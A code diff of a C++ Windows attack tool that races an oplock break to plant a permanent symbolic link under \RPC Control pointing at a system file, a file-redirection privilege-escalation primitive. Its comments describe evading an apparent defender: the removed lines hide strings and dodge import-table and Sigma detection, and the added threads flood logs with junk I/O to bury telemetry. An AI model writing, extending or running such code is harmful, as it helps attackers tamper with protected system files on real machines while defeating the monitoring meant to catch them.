@@ -1,74 +1,120 @@
 #include <Windows.h>
+#include <winioctl.h>
 #include <winternl.h>
 #include <vector>
 #include <thread>
 #include <atomic>
 #include <iostream>
 
-// Simple XOR to hide strings from Davey's "strings" hunt
-void JoeyXOR(wchar_t* data, size_t len, wchar_t key) {
-    for (size_t i = 0; i < len; i++) data[i] ^= key;
+#pragma comment(lib, "ntdll.lib")
+
+// --- NATIVE DEFINITIONS ---
+typedef struct _JOEY_REPARSE_DATA {
+    ULONG  ReparseTag;
+    USHORT ReparseDataLength;
+    USHORT Reserved;
+    struct {
+        USHORT SubstituteNameOffset;
+        USHORT SubstituteNameLength;
+        USHORT PrintNameOffset;
+        USHORT PrintNameLength;
+        WCHAR PathBuffer[1];
+    } MountPoint;
+} JOEY_REPARSE_DATA;
+
+extern "C" NTSTATUS NTAPI NtCreateSymbolicLinkObject(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
+
+// --- THE SHATTERED VORTEX ---
+
+std::atomic<bool> g_OplockBroken{ false };
+std::atomic<bool> g_Win{ false };
+std::atomic<int> g_Barrier{ 0 };
+
+// Thread A: The Baiter (Handles the Oplock)
+void BaiterThread(std::wstring baitPath) {
+    HANDLE hFile = CreateFileW(baitPath.c_str(), GENERIC_ALL, 
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
+        NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) return;
+
+    OVERLAPPED ov = { 0 };
+    ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+    
+    // Request Oplock Level 1
+    DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ov);
+    
+    g_Barrier.fetch_add(1); // Ready
+
+    if (WaitForSingleObject(ov.hEvent, INFINITE) == WAIT_OBJECT_0) {
+        // TRIGGER: Something touched the file.
+        // We close the handle to release the lock, then signal the Shadow thread.
+        CloseHandle(hFile);
+        g_OplockBroken.store(true); 
+    }
+    CloseHandle(ov.hEvent);
 }
 
-// Function pointer for the native call
-typedef NTSTATUS(NTAPI* pNtCreateSymLink)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
+// Thread B: The Shadow (Performs the Pivot)
+// This thread is "idle" until the Oplock break signals it.
+// This breaks the "Sequence" Davey is hunting.
+void ShadowThread(std::wstring shadowDir, std::wstring baitPath, std::wstring target) {
+    while (!g_OplockBroken.load()) { YieldProcessor(); }
 
-void StealthVortex(int id, std::wstring workDir, std::wstring target, std::atomic<bool>& win) {
-    // 1. Hide the strings in memory
-    wchar_t rpc_path[] = { L'm' ^ 0x13, L'S' ^ 0x13, L'C' ^ 0x13, L' ' ^ 0x13, L'C' ^ 0x13, L'o' ^ 0x13, L'n' ^ 0x13, L't' ^ 0x13, L'r' ^ 0x13, L'o' ^ 0x13, L'l' ^ 0x13, L'm' ^ 0x13, 0 };
-    JoeyXOR(rpc_path, 12, 0x13); // Decodes to \RPC Control\
-
-    // 2. Resolve NTDLL calls dynamically to stay out of the IAT
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    auto NtCreateSymbolicLinkObject = (pNtCreateSymLink)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
-
-    // 3. Randomize naming to dodge "job_*" Sigma rules
-    // Mimics a Windows Update/Diagnostic path
-    std::wstring shadow = workDir + L"\\{B4F" + std::to_wstring(id + 1024) + L"-89DA-4F32}"; 
-    CreateDirectoryW(shadow.c_str(), NULL);
-    std::wstring bait = shadow + L"\\diag_output.etl"; // Looks like a standard trace log
-
-    // 4. Jittered Start: Avoid the lockstep ETW signature
-    Sleep(id * 5); 
-
-    while (!win.load()) {
-        HANDLE hBait = CreateFileW(bait.c_str(), GENERIC_ALL, 
-            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
-            NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
-
-        if (hBait == INVALID_HANDLE_VALUE) break;
-
-        OVERLAPPED ov = { 0 };
-        ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+    // Microsecond window: The Baiter just closed the handle.
+    // We clean up the directory and drop the link.
+    if (DeleteFileW(baitPath.c_str()) && RemoveDirectoryW(shadowDir.c_str())) {
         
-        // 5. Hide the FSCTL constant by calculating it at runtime
-        DWORD opCode = (0x00000009 << 16); // FSCTL_REQUEST_OPLOCK_LEVEL_1
-        DeviceIoControl(hBait, opCode, NULL, 0, NULL, 0, NULL, &ov);
+        HANDLE hLink;
+        UNICODE_STRING uLink, uTarget;
+        OBJECT_ATTRIBUTES objAttr;
+        
+        std::wstring linkPath = L"\\RPC Control\\SvcAudit_" + std::to_wstring(GetCurrentThreadId());
+        RtlInitUnicodeString(&uLink, linkPath.c_str());
+        RtlInitUnicodeString(&uTarget, (L"\\??\\" + target).c_str());
 
-        if (WaitForSingleObject(ov.hEvent, 250) == WAIT_OBJECT_0) {
-            CloseHandle(hBait);
-            hBait = INVALID_HANDLE_VALUE; 
+        InitializeObjectAttributes(&objAttr, &uLink, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);
 
-            if (DeleteFileW(bait.c_str()) && RemoveDirectoryW(shadow.c_str())) {
-                // Use a randomized name for the link too
-                std::wstring linkName = L"SvcControl_" + std::to_wstring(id);
-                
-                UNICODE_STRING uLink, uTarget;
-                std::wstring fullLink = std::wstring(rpc_path) + linkName;
-                RtlInitUnicodeString(&uLink, fullLink.c_str());
-                RtlInitUnicodeString(&uTarget, (L"\\??\\" + target).c_str());
-
-                OBJECT_ATTRIBUTES objAttr;
-                InitializeObjectAttributes(&objAttr, &uLink, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);
-
-                if (NT_SUCCESS(NtCreateSymbolicLinkObject(&hLink, 0xF0001, &objAttr, &uTarget))) {
-                    if (!win.exchange(true)) {
-                        std::wcout << L"[!] Mutation successful. Pivot established." << std::endl;
-                    }
-                }
-            }
+        if (NT_SUCCESS(NtCreateSymbolicLinkObject(&hLink, 0xF0001, &objAttr, &uTarget))) {
+            g_Win.store(true);
+            CloseHandle(hLink);
         }
-        if (hBait != INVALID_HANDLE_VALUE) CloseHandle(hBait);
-        CloseHandle(ov.hEvent);
     }
+}
+
+// Thread C: The Noise (Floods the logs with garbage I/O)
+void NoiseMaker(std::wstring workDir) {
+    while (!g_Win.load()) {
+        std::wstring junk = workDir + L"\\tmp_" + std::to_wstring(rand()) + L".dat";
+        HANDLE h = CreateFileW(junk.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+        if (h != INVALID_HANDLE_VALUE) {
+            WriteFile(h, "NOISE", 5, NULL, NULL);
+            CloseHandle(h);
+        }
+        Sleep(1);
+    }
+}
+
+int main() {
+    std::wstring workDir = L"C:\\Temp\\Diagnostic_Store";
+    std::wstring target = L"C:\\Windows\\System32\\drivers\\etc\\hosts"; // Example target
+    CreateDirectoryW(workDir.c_str(), NULL);
+
+    std::vector<std::thread> swarm;
+    
+    // Start 10 noise threads to drown out the telemetry
+    for(int i=0; i<10; i++) swarm.emplace_back(NoiseMaker, workDir);
+
+    // Setup the race pairs
+    for (int i = 0; i < 15; i++) {
+        std::wstring sub = workDir + L"\\set_" + std::to_wstring(i);
+        CreateDirectoryW(sub.c_str(), NULL);
+        std::wstring bait = sub + L"\\data.etl";
+
+        swarm.emplace_back(BaiterThread, bait);
+        swarm.emplace_back(ShadowThread, sub, bait, target);
+    }
+
+    for (auto& t : swarm) t.join();
+    return 0;
 }
